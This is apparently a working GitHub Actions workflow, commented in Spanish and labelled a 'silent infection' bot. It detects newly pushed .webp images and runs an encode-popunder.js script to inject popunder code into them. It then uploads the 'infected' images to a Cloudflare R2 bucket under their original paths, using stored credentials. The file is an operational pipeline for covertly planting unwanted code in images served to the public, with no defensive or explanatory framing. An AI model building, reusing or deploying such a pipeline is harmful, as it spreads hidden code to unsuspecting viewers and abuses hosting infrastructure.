name: Bot Bacteria Popunder - Infección Silenciosa

on:
  push:
    paths:
      - '**/*.webp' # El bot solo se activa cuando subes una imagen .webp

jobs:
  infectar-y-desplegar:
    runs-on: ubuntu-latest

    steps:
    - name: 📥 Clonar repositorio
      uses: actions/checkout@v4
      with:
        fetch-depth: 2 # Permite comparar con el commit anterior

    - name: 🔍 Detectar archivo .webp nuevo
      id: detect
      run: |
        # Localiza el archivo .webp modificado o subido
        ARCHIVO=$(git diff-tree --no-commit-id --name-only -r ${{ github.sha }} | grep '\.webp$' | head -n 1)
        
        if [ -z "$ARCHIVO" ]; then
          echo "No se detectó ningún archivo .webp para procesar."
          exit 0
        fi

        echo "Infectando: $ARCHIVO"
        
        # Extraer rutas para R2
        CARPETA=$(dirname "$ARCHIVO")
        NOMBRE_ARCHIVO=$(basename "$ARCHIVO")
        
        echo "CARPETA=$CARPETA" >> $GITHUB_ENV
        echo "NOMBRE_ARCHIVO=$NOMBRE_ARCHIVO" >> $GITHUB_ENV
        echo "ARCHIVO_ORIGINAL=$ARCHIVO" >> $GITHUB_ENV

    - name: 🛠️ Configurar Node.js
      uses: actions/setup-node@v4
      with:
        node-version: '20'

    - name: 📦 Instalar dependencias (Sharp)
      run: npm install

    - name: 🧪 Preparar imagen para el Bot
      run: cp "${{ env.ARCHIVO_ORIGINAL }}" input.webp 

    - name: 💉 Ejecutar Inyección Popunder (Multi-Canal)
      run: node encode-popunder.js

    - name: ☁️ Desplegar a Cloudflare R2 (nogle-pics)
      env:
        AWS_ACCESS_KEY_ID: ${{ secrets.R2_ACCESS_KEY_ID }}
        AWS_SECRET_ACCESS_KEY: ${{ secrets.R2_SECRET_ACCESS_KEY }}
        AWS_DEFAULT_REGION: auto
      run: |
        # Subida directa usando la misma estructura de carpetas que en GitHub
        aws s3 cp output_infected.webp s3://nogle-pics/${{ env.CARPETA }}/${{ env.NOMBRE_ARCHIVO }} \
          --endpoint-url https://366c94c9611100cd543f5f004747c489.r2.cloudflarestorage.com

